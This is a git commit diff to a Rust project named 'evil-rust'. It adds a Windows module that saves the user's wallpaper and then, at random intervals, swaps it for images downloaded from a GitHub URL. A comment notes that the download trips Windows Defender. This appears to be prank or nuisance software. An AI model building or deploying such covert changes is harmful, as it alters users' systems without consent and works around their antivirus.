2ae6efdf35d5e15eaa72d3c96a284a25bbb8f115
jakub.kolacek <jakub.kolacek@ibacz.eu>
2024-08-18 12:20:57 +0200

    Wallpaper change module works

--- evil-rust/src/wallpaper/mod.rs
+++ evil-rust/src/wallpaper/mod.rs
@@ -1,9 +1,15 @@
+extern crate winapi;
+
+use std::ffi::CString;
 use std::fs;
-use std::ops::Range;
+use std::ops::{Add, Range};
 use std::path::PathBuf;
+use std::time::{Duration, SystemTime};
 use rand::Rng;
 use serde::{Deserialize, Serialize};
-use crate::config::{BaseConfig, load_config, MINUTE, ModuleConfig, save_module_config};
+use winapi::um::winuser::{SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
+use winapi::um::winuser::SystemParametersInfoA;
+use crate::config::{BaseConfig, load_config, MINUTE, ModuleConfig, save_module_config, SECOND};
 #[cfg(not(debug_assertions))]
 use crate::config::MAN_DAY;
 use crate::module::Module;
@@ -21,21 +27,26 @@ pub struct WallpaperModule {
     source_http: String,
     frequency_range: Range<u32>,
     original_wallpaper: Option<String>,
+    next_change: SystemTime,
 }
 
 impl ModuleConfig for WallpaperModule {
     fn new(base_config: &BaseConfig) -> Self {
         let module_home = WallpaperModule::construct_module_home(base_config.get_home_dir());
+
+        #[cfg(debug_assertions)]
+            let frequency_range = SECOND..10 * SECOND;
+        #[cfg(not(debug_assertions))]
+            let frequency_range = MINUTE..MAN_DAY;
+
         load_config(&module_home, MODULE_NAME).unwrap_or_else(|_| {
             let default = Self {
                 enabled: true,
                 wallpaper_dir: module_home,
                 source_http: String::from(GITHUB_ROOT),
                 original_wallpaper: None,
-                #[cfg(debug_assertions)]
-                frequency_range: (MINUTE..2 * MINUTE),
-                #[cfg(not(debug_assertions))]
-                frequency_range: (MINUTE..MAN_DAY),
+                frequency_range: (frequency_range.clone()),
+                next_change: SystemTime::now().add(Duration::from_secs(rand::thread_rng().gen_range(frequency_range) as u64)),
             };
 
             save_module_config(&default).unwrap_or_else(|e| {
@@ -75,7 +86,13 @@ impl ModuleConfig for WallpaperModule {
 
 impl Module for WallpaperModule {
     fn trigger(&mut self) {
+        let change_now = self.get_next_change().lt(&SystemTime::now());
+        if !change_now {
+            log::debug!("Not switching wallpaper, next change in: {:?}", self.get_next_change());
+            return;
+        }
         log::debug!("Triggering wallpaper module");
+        self.set_next_change(SystemTime::now().add(Duration::from_secs(self.get_next_frequency() as u64)));
         self.ensure_files_exist();
         self.switch_wallpaper();
     }
@@ -90,6 +107,15 @@ impl WallpaperModule {
         self.frequency_range.clone()
     }
 
+    fn get_next_change(&self) -> SystemTime {
+        self.next_change
+    }
+
+    fn set_next_change(&mut self, next_change: SystemTime) {
+        self.next_change = next_change;
+        self.persist();
+    }
+
     fn set_original_wallpaper(&mut self, original_wallpaper: String) {
         self.original_wallpaper = Some(original_wallpaper);
         self.persist();
@@ -99,16 +125,41 @@ impl WallpaperModule {
         self.original_wallpaper.clone()
     }
 
+    fn get_random_wallpaper(&self) -> PathBuf {
+        let mut wallpaper_dir = self.wallpaper_dir.clone();
+        wallpaper_dir.push(rand::thread_rng().gen_range(0..5).to_string());
+        wallpaper_dir.set_extension("jpg");
+        wallpaper_dir
+    }
+
     // #[cfg(debug_assertions)]
     fn switch_wallpaper(&mut self) {
         // log::warn!("Not switching wallpaper in debug mode");
         let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
-        let desktop = hkcu.open_subkey_with_flags(REGISTRY_KEY, winreg::enums::KEY_ALL_ACCESS).unwrap();
+        let desktop = hkcu.open_subkey_with_flags(REGISTRY_KEY, winreg::enums::KEY_READ).unwrap();
         // let desktop = hkcu.open_subkey(REGISTRY_KEY).unwrap();
         if self.get_original_wallpaper().is_none() {
             let wallpaper_reg_value: String = desktop.get_value("Wallpaper").unwrap();
             log::debug!("Current wallpaper: {}", wallpaper_reg_value);
             self.set_original_wallpaper(wallpaper_reg_value.clone());
+        }
+
+        let wallpaper_path = self.get_random_wallpaper();
+        log::debug!("Setting wallpaper to: {}", wallpaper_path.to_str().unwrap());
+        let mut c_wallpaper_path = CString::new(wallpaper_path.to_str().unwrap()).unwrap();
+        /*
+        C code does not know how to deal with a Rust type: it is only aware of C strings and instead expects a pointer to the first byte.
+        It also expects the string to be NUL terminated, which Rust strings are not. Thus it makes no sense to pass a Rust &str to C code
+        in this case and this is exactly the reason CStr and CString exist.
+        https://stackoverflow.com/a/59030949
+         */
+        // #[cfg(not(debug_assertions))]
+        // desktop.set_value("Wallpaper", &wallpaper_path.to_str().unwrap()).unwrap();
+        // #[cfg(not(debug_assertions))]
+        // somehow it fucks up like this
+        // C:\Users\JAKUB~1.KOL\AppData\Local\Temp\Evilyn\wallpaper\2.jpgaper.toml
+        unsafe {
+            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, c_wallpaper_path.as_ptr() as *mut winapi::ctypes::c_void, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         }
     }
 
@@ -126,6 +177,7 @@ impl WallpaperModule {
     }
 
     fn download_files(&self) {
+        // The actual download triggers Windows Defender after 4th file.
         for i in 0..10 {
             let url = format!("{}{}.jpg", self.source_http, i);
             log::debug!("Downloading file from url: {}", url);
